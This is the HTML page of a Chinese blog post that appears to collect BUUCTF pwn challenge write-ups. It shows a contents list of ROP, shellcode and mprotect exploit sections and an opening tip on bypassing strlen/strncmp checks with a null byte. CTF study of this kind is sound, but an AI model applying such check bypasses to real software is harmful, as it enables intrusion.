<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BUU刷题-1 | 墨水彩笔</title><meta name="author" content="墨水彩笔"><meta name="copyright" content="墨水彩笔"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="BABYROP小课堂1.关于strlen和strncmp这类检查函数的绕过：我们只需要输入以‘\x00’开头的字符串截断就可以绕过判断了 2.数组的概念：我这里理解的数组概念，在32位中数组的一位就是4字节，如果又32个字节的大小，那么数组的大小就是8个，即下标为0-7. checksec和查看运行流程 32位的程序，并且开启了RELRO和NX。  运行的时候什么提示也没有，就是让我们输入一次（以">
<meta property="og:type" content="article">
<meta property="og:title" content="BUU刷题-1">
<meta property="og:url" content="http://example.com/2021/08/12/BUU%E5%88%B7%E9%A2%98-1/index.html">
<meta property="og:site_name" content="墨水彩笔">
<meta property="og:description" content="BABYROP小课堂1.关于strlen和strncmp这类检查函数的绕过：我们只需要输入以‘\x00’开头的字符串截断就可以绕过判断了 2.数组的概念：我这里理解的数组概念，在32位中数组的一位就是4字节，如果又32个字节的大小，那么数组的大小就是8个，即下标为0-7. checksec和查看运行流程 32位的程序，并且开启了RELRO和NX。  运行的时候什么提示也没有，就是让我们输入一次（以">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2021-08-12T01:16:16.000Z">
<meta property="article:modified_time" content="2023-02-10T12:44:25.329Z">
<meta property="article:author" content="墨水彩笔">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/08/12/BUU%E5%88%B7%E9%A2%98-1/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  hexoversion: '5.2.0',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true,
  postUpdate: '2023-02-10 20:44:25'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {
  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }

  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }
})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">76</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BABYROP"><span class="toc-number">1.</span> <span class="toc-text">BABYROP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E8%AF%BE%E5%A0%82"><span class="toc-number">1.1.</span> <span class="toc-text">小课堂</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%92%8C%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">checksec和查看运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">利用IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D"><span class="toc-number">1.4.</span> <span class="toc-text">构思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">1.5.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2019-n-8"><span class="toc-number">2.</span> <span class="toc-text">ciscn_2019_n_8</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%92%8C%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">2.1.</span> <span class="toc-text">checksec和运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90-1"><span class="toc-number">2.2.</span> <span class="toc-text">利用IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.3.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-started-3dsctf-2016-1"><span class="toc-number">2.4.</span> <span class="toc-text">get_started_3dsctf_2016 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%B9%B6%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">2.5.</span> <span class="toc-text">checksec并查看运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90%E6%9F%A5%E7%9C%8B"><span class="toc-number">2.6.</span> <span class="toc-text">利用IDA分析查看</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E6%8A%80%E5%B7%A7"><span class="toc-number">2.6.1.</span> <span class="toc-text">小技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D-1"><span class="toc-number">2.7.</span> <span class="toc-text">构思</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%9B%B4%E6%8E%A5%E8%B7%B3%E8%BD%AC%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84shell%E6%88%96%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E6%8F%90%E5%8F%96flag%E7%9A%84%E5%87%BD%E6%95%B0%E4%B8%AD"><span class="toc-number">2.7.1.</span> <span class="toc-text">1.直接跳转程序中的shell或可以直接提取flag的函数中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E5%87%BD%E6%95%B0%E4%BC%A0%E9%80%92%E7%9A%84%E7%89%B9%E6%80%A7"><span class="toc-number">2.7.2.</span> <span class="toc-text">2.我们可以利用函数传递的特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E6%8A%80%E5%B7%A7-1"><span class="toc-number">2.7.3.</span> <span class="toc-text">小技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8mprotect%E5%87%BD%E6%95%B0%E7%9A%84%E7%89%B9%E6%80%A7%E4%BF%AE%E6%94%B9%E6%9D%83%E9%99%90"><span class="toc-number">2.7.4.</span> <span class="toc-text">3.利用mprotect函数的特性修改权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-2"><span class="toc-number">2.8.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">2.9.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-en-2-1"><span class="toc-number">2.10.</span> <span class="toc-text">ciscn_2019_en_2 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%92%8C%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B-1"><span class="toc-number">2.11.</span> <span class="toc-text">checksec和查看运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90-2"><span class="toc-number">2.12.</span> <span class="toc-text">利用IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D-2"><span class="toc-number">2.13.</span> <span class="toc-text">构思</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E6%8A%80%E5%B7%A7%EF%BC%9A"><span class="toc-number">2.13.1.</span> <span class="toc-text">小技巧：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-3"><span class="toc-number">2.14.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">2.15.</span> <span class="toc-text">总结：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2020-babystack"><span class="toc-number">3.</span> <span class="toc-text">2020_babystack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%92%8C%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">3.1.</span> <span class="toc-text">checksec和查看程序运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90-3"><span class="toc-number">3.2.</span> <span class="toc-text">利用IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-4"><span class="toc-number">3.3.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#not-the-same-3dsctf-2016-1"><span class="toc-number">3.4.</span> <span class="toc-text">not_the_same_3dsctf_2016 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%92%8C%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B-2"><span class="toc-number">3.5.</span> <span class="toc-text">checksec和查看运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E6%9F%A5%E7%9C%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.6.</span> <span class="toc-text">利用IDA查看分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D-3"><span class="toc-number">3.7.</span> <span class="toc-text">构思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95EXP"><span class="toc-number">3.8.</span> <span class="toc-text">尝试EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93"><span class="toc-number">3.8.1.</span> <span class="toc-text">分析总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E7%A1%AE%E7%9A%84%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">3.9.</span> <span class="toc-text">正确的解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8mprotect%E5%87%BD%E6%95%B0%E4%BF%AE%E6%94%B9%E6%9D%83%E9%99%90%E7%A0%B4%E8%A7%A3%E5%A0%86%E6%A0%88%E6%AE%B5%E4%B8%8D%E5%8F%AF%E5%86%99"><span class="toc-number">3.9.1.</span> <span class="toc-text">1.使用mprotect函数修改权限破解堆栈段不可写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E5%85%B6%E5%AE%9E%E6%9C%89%E7%89%B9%E6%AE%8A%E5%87%BD%E6%95%B0"><span class="toc-number">3.9.2.</span> <span class="toc-text">2.我们可以发现其实有特殊函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-number">3.10.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HarekazeCTF2019-baby-rop-1"><span class="toc-number">4.</span> <span class="toc-text">[HarekazeCTF2019]baby_rop 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%92%8C%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B-3"><span class="toc-number">4.1.</span> <span class="toc-text">checksec和查看运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90-4"><span class="toc-number">4.2.</span> <span class="toc-text">利用IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D-4"><span class="toc-number">4.3.</span> <span class="toc-text">构思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-5"><span class="toc-number">4.4.</span> <span class="toc-text">EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E6%8A%80%E5%B7%A7-2"><span class="toc-number">4.4.1.</span> <span class="toc-text">小技巧</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#jarvisoj-level2-x64"><span class="toc-number">5.</span> <span class="toc-text">jarvisoj_level2_x64</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%92%8C%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B-4"><span class="toc-number">5.1.</span> <span class="toc-text">checksec和查看运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90-5"><span class="toc-number">5.2.</span> <span class="toc-text">利用IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D-5"><span class="toc-number">5.3.</span> <span class="toc-text">构思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-6"><span class="toc-number">5.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2019-n-5"><span class="toc-number">6.</span> <span class="toc-text">ciscn_2019_n_5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%92%8C%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B-5"><span class="toc-number">6.1.</span> <span class="toc-text">checksec和查看运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90-6"><span class="toc-number">6.2.</span> <span class="toc-text">利用IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D-6"><span class="toc-number">6.3.</span> <span class="toc-text">构思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-7"><span class="toc-number">6.4.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#others-shellcode"><span class="toc-number">6.5.</span> <span class="toc-text">others_shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-ne-5"><span class="toc-number">6.6.</span> <span class="toc-text">ciscn_2019_ne_5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%92%8C%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B-6"><span class="toc-number">6.7.</span> <span class="toc-text">checksec和查看运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90-7"><span class="toc-number">6.8.</span> <span class="toc-text">利用IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D-7"><span class="toc-number">6.9.</span> <span class="toc-text">构思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-8"><span class="toc-number">6.10.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA-2018-rop"><span class="toc-number">7.</span> <span class="toc-text">铁人三项(第五赛区)_2018_rop</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%92%8C%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B-7"><span class="toc-number">7.1.</span> <span class="toc-text">checksec和查看运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90-8"><span class="toc-number">7.2.</span> <span class="toc-text">利用IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D-8"><span class="toc-number">7.3.</span> <span class="toc-text">构思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-9"><span class="toc-number">7.4.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-babyrop"><span class="toc-number">7.5.</span> <span class="toc-text">bjdctf_2020_babyrop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-10"><span class="toc-number">7.6.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn2-sctf-2016"><span class="toc-number">8.</span> <span class="toc-text">pwn2_sctf_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%92%8C%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B-8"><span class="toc-number">8.1.</span> <span class="toc-text">checksec和查看运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90-9"><span class="toc-number">8.2.</span> <span class="toc-text">利用IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D-9"><span class="toc-number">8.3.</span> <span class="toc-text">构思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-11"><span class="toc-number">8.4.</span> <span class="toc-text">EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%9F%A5%E8%AF%86"><span class="toc-number">8.4.1.</span> <span class="toc-text">小知识</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-fm"><span class="toc-number">8.5.</span> <span class="toc-text">jarvisoj_fm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-babystack2"><span class="toc-number">8.6.</span> <span class="toc-text">bjdctf_2020_babystack2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%92%8C%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B-9"><span class="toc-number">8.7.</span> <span class="toc-text">checksec和查看运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90-10"><span class="toc-number">8.8.</span> <span class="toc-text">利用IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D-10"><span class="toc-number">8.9.</span> <span class="toc-text">构思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HarekazeCTF2019-baby-rop2"><span class="toc-number">8.10.</span> <span class="toc-text">[HarekazeCTF2019]baby_rop2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%92%8C%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B-10"><span class="toc-number">8.11.</span> <span class="toc-text">checksec和查看运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90-11"><span class="toc-number">8.12.</span> <span class="toc-text">利用IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D-11"><span class="toc-number">8.13.</span> <span class="toc-text">构思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-12"><span class="toc-number">8.14.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2019-es-2"><span class="toc-number">9.</span> <span class="toc-text">ciscn_2019_es_2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%92%8C%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B-11"><span class="toc-number">9.1.</span> <span class="toc-text">checksec和查看运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA%E5%88%86%E6%9E%90"><span class="toc-number">9.2.</span> <span class="toc-text">IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D-12"><span class="toc-number">9.3.</span> <span class="toc-text">构思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-13"><span class="toc-number">9.4.</span> <span class="toc-text">EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%96%91%E6%83%91"><span class="toc-number">9.4.1.</span> <span class="toc-text">小疑惑</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#jarvisoj-level3"><span class="toc-number">10.</span> <span class="toc-text">jarvisoj_level3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%92%8C%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B-12"><span class="toc-number">10.1.</span> <span class="toc-text">checksec和查看运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA%E5%88%86%E6%9E%90-1"><span class="toc-number">10.2.</span> <span class="toc-text">IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D-13"><span class="toc-number">10.3.</span> <span class="toc-text">构思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-14"><span class="toc-number">10.4.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-pz-hackover-2016"><span class="toc-number">10.5.</span> <span class="toc-text">ez_pz_hackover_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%92%8C%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B-13"><span class="toc-number">10.6.</span> <span class="toc-text">checksec和查看运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90-12"><span class="toc-number">10.7.</span> <span class="toc-text">利用IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D-14"><span class="toc-number">10.8.</span> <span class="toc-text">构思</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E6%8A%80%E5%B7%A7-3"><span class="toc-number">10.8.1.</span> <span class="toc-text">小技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-15"><span class="toc-number">10.9.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-tell-me-something"><span class="toc-number">10.10.</span> <span class="toc-text">jarvisoj_tell_me_something</span></a></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">墨水彩笔</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">BUU刷题-1</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-08-12T01:16:16.000Z" title="Created 2021-08-12 09:16:16">2021-08-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-02-10T12:44:25.329Z" title="Updated 2023-02-10 20:44:25">2023-02-10</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="BABYROP"><a href="#BABYROP" class="headerlink" title="BABYROP"></a>BABYROP</h1><h2 id="小课堂"><a href="#小课堂" class="headerlink" title="小课堂"></a>小课堂</h2><p>1.关于strlen和strncmp这类检查函数的绕过：我们只需要输入以‘\x00’开头的字符串截断就可以绕过判断了</p>
<p>2.数组的概念：我这里理解的数组概念，在32位中数组的一位就是4字节，如果又32个字节的大小，那么数组的大小就是8个，即下标为0-7.</p>
